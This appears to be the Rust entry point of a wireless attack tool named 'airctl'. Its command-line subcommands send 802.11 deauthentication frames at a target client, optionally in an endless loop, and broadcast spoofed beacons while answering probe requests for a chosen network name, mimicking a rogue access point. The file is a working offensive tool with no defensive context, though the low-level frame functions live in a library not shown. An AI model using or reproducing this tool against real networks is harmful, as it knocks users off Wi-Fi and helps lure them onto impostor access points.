use std::{
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
    thread,
    time::Duration,
};

use airctl::{
    af_eth::{self, FrameName},
    helper::channel_to_freq,
    nl_gen,
};

use clap::{Args, Parser, Subcommand};

#[derive(Parser, Debug)]
#[command(author, version, about)]
pub struct Cli {
    #[command(subcommand)]
    pub command: Commands,
}

#[derive(Args, Debug, Clone)]
pub struct WirelessArgs {
    #[arg(short, long)]
    pub interface: String,
    #[arg(short, long)]
    pub channel: u16,
    #[arg(short, long)]
    pub target: Option<String>,
    #[arg(short, long)]
    pub bssid: String,
    #[arg(short, long)]
    pub gap: Option<u64>,
    #[arg(short, long)]
    pub repeat: Option<usize>,
}

#[derive(Subcommand, Debug)]
pub enum Commands {
    Dauth {
        #[command(flatten)]
        args: WirelessArgs,
    },
    Bcon {
        #[command(flatten)]
        args: WirelessArgs,
        #[arg(short, long)]
        ssid: String,
    },
    Stop,
}

fn main() {
    let cli = Cli::parse();

    let command = cli.command;

    match command {
        Commands::Dauth {
            args:
                WirelessArgs {
                    interface,
                    channel,
                    target,
                    bssid,
                    gap,
                    repeat,
                },
        } => {
            let target = match target.as_deref() {
                Some(target) => target,
                None => panic!("No target specified"),
            };

            let target = parse_mac(&target);
            let bssid = parse_mac(&bssid);

            let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
            af_ctrl.sock_bind();

            thread::sleep(Duration::from_millis(200));
            let mut nl_ctrl = nl_gen::Ctrl::new(interface);
            nl_ctrl.bind();

            let freq = match channel_to_freq(channel) {
                Some(freq) => freq,
                None => panic!("Unsupported channel: {channel}"),
            };

            nl_ctrl.set_frequency(freq);
            af_ctrl.drain();

            match (gap, repeat) {
                (None, Some(r)) => {
                    for _ in 0..r {
                        af_ctrl.deauth(target, bssid);
                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                        thread::sleep(Duration::from_millis(500));
                    }
                }
                (Some(g), Some(r)) => {
                    for _ in 0..r {
                        af_ctrl.deauth(target, bssid);
                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                        thread::sleep(Duration::from_millis(g));
                    }
                }
                _ => loop {
                    af_ctrl.deauth(target, bssid);
                    println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                    thread::sleep(Duration::from_millis(500));
                },
            }
        }
        Commands::Bcon {
            args:
                WirelessArgs {
                    interface,
                    channel,
                    target: _,
                    bssid,
                    gap,
                    repeat,
                },

            ssid,
        } => {
            let bssid = parse_mac(&bssid);

            let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
            af_ctrl.sock_bind();

            thread::sleep(Duration::from_millis(200));
            let mut nl_ctrl = nl_gen::Ctrl::new(interface.clone());
            nl_ctrl.bind();

            let freq = match channel_to_freq(channel.clone()) {
                Some(freq) => freq,
                None => panic!("Unsupported channel: {channel}"),
            };

            nl_ctrl.set_frequency(freq);
            af_ctrl.drain();

            let running = Arc::new(AtomicBool::new(true));

            let mut af_ctrl2 = af_eth::Ctrl::new(interface.clone());
            af_ctrl2.sock_bind();

            let terminal_running = Arc::clone(&running);

            let mut seq_counter = 0;
            let ssid_clone = ssid.clone();

            let worker_thread = thread::spawn(move || {
                while running.load(Ordering::Relaxed) {
                    match af_ctrl2.accept_timeout(100) {
                        Some((_, packet_info, _)) => match packet_info.frame_name {
                            FrameName::ProbeRequest => {
                                af_ctrl2.prope_responce(
                                    bssid,
                                    parse_mac(&packet_info.transmitter),
                                    &ssid_clone,
                                    channel,
                                    seq_counter,
                                );
                            }
                            _ => {}
                        },
                        None => {}
                    }
                    seq_counter = seq_counter.wrapping_add(1);
                }
            });

            let mut seq_counter: u16 = 0;

            match (gap, repeat) {
                (None, Some(r)) => {
                    for _ in 0..r {
                        af_ctrl.beacons(bssid, &ssid, channel, seq_counter);

                        // println!("Becons Packet sent: {:?} -> {:?}", bssid, ssid);
                        thread::sleep(Duration::from_millis(100));
                        seq_counter = (seq_counter + 1) % 4096;
                    }
                    terminal_running.store(false, Ordering::Relaxed);
                }
                (Some(g), Some(r)) => {
                    for _ in 0..r {
                        af_ctrl.beacons(bssid, &ssid, channel, seq_counter);
                        // println!("Becons Packet sent: {:?} -> {:?}", bssid, ssid);
                        thread::sleep(Duration::from_millis(g));
                        seq_counter = (seq_counter + 1) % 4096;
                    }
                    terminal_running.store(false, Ordering::Relaxed);
                }
                _ => loop {
                    af_ctrl.beacons(bssid, &ssid, channel, seq_counter);
                    // println!("Becons Packet sent: {:?} -> {:?}", bssid, ssid);
                    thread::sleep(Duration::from_millis(100));
                    seq_counter = (seq_counter + 1) % 4096;
                },
            }
            let _ = worker_thread.join();
        }
        _ => {}
    }
}

fn parse_mac(s: &str) -> [u8; 6] {
    let parts: Vec<&str> = s.split(':').collect();

    if parts.len() != 6 {
        panic!("MAC address must contain 6 bytes");
    }

    let mut mac = [0u8; 6];

    for (i, part) in parts.iter().enumerate() {
        mac[i] = u8::from_str_radix(part, 16)
            .map_err(|_| format!("Invalid MAC byte: {part}"))
            .unwrap();
    }
    mac
}
